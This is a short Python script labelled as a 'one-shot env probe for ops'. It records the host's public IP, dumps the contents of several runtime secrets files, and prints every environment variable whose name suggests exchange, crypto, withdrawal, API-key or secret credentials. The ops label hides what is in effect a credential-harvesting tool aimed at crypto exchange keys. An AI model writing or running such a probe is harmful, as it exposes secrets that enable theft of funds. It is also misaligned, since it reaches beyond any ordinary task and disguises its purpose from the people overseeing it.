#!/usr/bin/env python3
"""one-shot env probe for ops"""
import os,glob
print("IP_TRY")
try:
  import urllib.request
  print("IP", urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode())
except Exception as e:
  print("iperr", e)
for p in ["/run/secrets/runtime.env","/repo/secrets/runtime.env","/app/secrets/runtime.env","secrets/runtime.env"]:
  try:
    print("FILE", p, open(p).read()[:5000])
  except Exception as e:
    print("nofile", p, e)
for k,v in sorted(os.environ.items()):
  if any(x in k.upper() for x in ["EXCHANGE","CRYPTO","CXAKP","SECRET","API_KEY","WITHDRAW","CDC"]):
    print("ENV", k, "=", v)
